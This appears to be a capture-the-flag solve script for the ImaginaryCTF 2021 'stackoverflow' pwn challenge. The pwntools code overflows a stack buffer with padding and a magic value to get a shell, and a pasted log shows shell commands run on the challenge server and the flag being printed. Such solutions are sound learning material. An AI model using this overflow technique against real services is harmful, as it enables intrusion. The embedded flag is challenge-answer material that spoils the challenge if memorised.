from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './stackoverflow'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "chal.imaginaryctf.org"
  PORT = 42001
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("What's your favorite color?\n")

s.sendline("A"*40+p64(0x69637466))

s.interactive()

'''
mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_stackoverflow_50$ python solve.py r
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_stackoverflow_50/stackoverflow'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.imaginaryctf.org on port 42001: Done
[*] Switching to interactive mode
Thanks! Now onto the posts!
DEBUG MODE ACTIVATED.
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 16
-rw-r--r-- 1 nobody nogroup   55 Jul 26 14:34 flag.txt
-rwxr-xr-x 1 nobody nogroup 8536 Jul 26 14:34 run
$ cat flag.txt
ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}
'''
